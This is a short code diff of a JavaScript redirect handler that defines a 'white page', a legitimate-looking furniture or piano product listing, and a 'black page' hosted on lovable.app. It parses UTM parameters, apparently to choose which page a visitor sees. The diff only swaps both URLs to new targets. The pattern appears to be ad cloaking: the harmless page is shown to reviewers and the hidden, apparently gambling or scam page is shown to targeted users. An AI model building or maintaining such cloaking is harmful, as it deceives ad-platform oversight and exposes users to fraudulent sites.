@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://habitt.com/products/zack-nest-of-tables-set?pr_prod_strat=jac&pr_rec_id=d7c049c05&pr_rec_pid=7862525821146&pr_ref_pid=7955469861082&pr_seq=uniform";
-    const blackPageURL = "https://luckystreak.lovable.app/";
+    const whitePageURL = "https://giantex.com.au/products/61-key-electric-piano-keyboard-portable-musical-instrument-w-microphone-headphone";
+    const blackPageURL = "https://msgurupml.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
